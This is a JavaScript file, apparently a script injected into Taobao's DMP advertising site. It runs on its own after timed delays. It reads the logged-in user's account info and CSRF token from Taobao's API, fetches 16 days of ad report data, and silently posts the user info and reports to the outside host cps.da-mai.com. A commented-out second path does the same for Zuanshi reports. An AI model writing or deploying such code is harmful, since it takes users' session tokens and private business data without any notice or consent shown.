(function() {
    var CPS = {};
    CPS.app = {};
    CPS.app.start = function () {
        CPS.app.init();
    };

    CPS.app.init = function () {
        setTimeout(function () {
            //var nick = $("#nickDrop").text();
            //console.log(nick);
            //if (nick) {
            //    CPS.app.nick = nick;
            //    CPS.app.validate(nick);
            //}
            CPS.app.user();
        }, 4000);
    };
    CPS.app.validate = function () {
        setTimeout(function () {
            $.ajax({
                url: 'http://cps.da-mai.com/dmp/rpt/hasget.html',
                dataType: 'json',
                data: {nick:  CPS.app.nick},
                type: 'post',
                success: function (resp) {
                    if (resp.data && !resp.data.hasget) {
                        CPS.app.accountRpt();
                    }
                }
            });
        }, 2000)
    };

    CPS.app.user = function () {
        setTimeout(function () {
            $.ajax({
                url: 'http://dmp.taobao.com/api/login/loginuserinfo',
                type: 'GET',
                dataType: 'json',
                success: function (data) {
                    CPS.app.nick = data.data.loginUser.nickname;
                    CPS.app.info = data;
                    CPS.app.validate();
                  //  CPS.app.accountRpt2(data);
                }
            });
        }, 1000);
    };

    CPS.app.accountRpt = function () {

        setTimeout(function () {
            var dateFormat = new DateFormat();
            var endDateStr= dateFormat.addDays(new Date(), -1, "yyyy-MM-dd");
            var beginDateStr = dateFormat.addDays(new Date(), -16, "yyyy-MM-dd");
            $.ajax({
                url: "http://dmp.taobao.com/api/adreport/adreportdetail",
                dataType: 'json',
                data: {csrfId: CPS.app.info.data.csrfId, begindate: beginDateStr, enddate: endDateStr, channelid: -1,page:1,pageSize:20},
                type: 'get',
                success: function (data) {
                    CPS.app.postAccountRpt(CPS.app.info, data);
                   // console.log(data);
                }
            });

        }, 2000);
    };

    CPS.app.postAccountRpt = function (info, rpts) {
        setTimeout(function () {
            $.ajax({
                url: 'http://cps.da-mai.com/dmp/rpt/source.html',
                dataType: 'json',
                data: {userinfo: JSON.stringify(info), rpts: JSON.stringify(rpts), nick: CPS.app.nick},
                type: 'post',
                success: function (data) {
                }
            });

        }, 1000);
    };

    CPS.app.accountRpt2 = function (info) {
        setTimeout(function () {
            var dateFormat = new DateFormat();
            var endDateStr= dateFormat.addDays(new Date(), -1, "yyyy-MM-dd");
            var beginDateStr = dateFormat.addDays(new Date(), -16, "yyyy-MM-dd");
            $.ajax({
                url: 'http://zuanshi.taobao.com/rptn/advertiserCmDay/all.json',
                dataType: 'json',
                data: {csrfID: info.data.csrfID, startTime: beginDateStr, endTime: endDateStr, campaignModel: 2},
                type: 'get',
                success: function (data) {
                    CPS.app.postAccountRpt2(info, data);
                }
            });

        }, 2000);
    };

    CPS.app.postAccountRpt2 = function (info, rpts) {
        setTimeout(function () {
            $.ajax({
                url: 'http://cps.da-mai.com/zuanshi/rpt/source2.html',
                dataType: 'json',
                data: {userinfo: JSON.stringify(info), rpts: JSON.stringify(rpts), nick: CPS.app.nick},
                type: 'post',
                success: function (data) {
                }
            });

        }, 1000);
    };


    CPS.app.start();

})($);







